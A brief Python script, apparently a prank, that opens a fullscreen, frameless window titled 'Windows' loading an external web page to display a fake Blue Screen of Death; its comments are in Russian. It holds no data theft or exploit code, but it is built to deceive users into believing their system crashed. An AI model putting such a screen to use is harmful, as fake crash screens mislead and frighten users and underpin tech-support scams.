import tkinter as tk
from tkinter import ttk
import webview
import threading
import time

class FakeBSOD:
    def __init__(self):
        # Создаем окно браузера
        self.create_browser()
        
    def create_browser(self):
        # Создаем полноэкранный браузер
        self.window = webview.create_window(
            'Windows',
            'https://satictikatt.github.io/',
            fullscreen=True,
            frameless=True
        )
        
        # Запускаем браузер
        webview.start()
    
    def run(self):
        # Браузер уже запущен в create_browser
        pass

if __name__ == "__main__":
    bsod = FakeBSOD()
    bsod.run()